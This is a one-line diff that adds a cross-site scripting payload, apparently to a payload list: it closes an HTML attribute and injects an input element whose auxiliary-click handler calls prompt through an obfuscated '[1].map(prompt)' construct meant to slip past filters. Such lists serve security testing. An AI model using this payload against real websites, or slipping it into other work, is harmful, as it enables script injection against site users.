@@ -1,0 +1,1 @@
+"><input/onauxclick​="[1].map(prompt)">
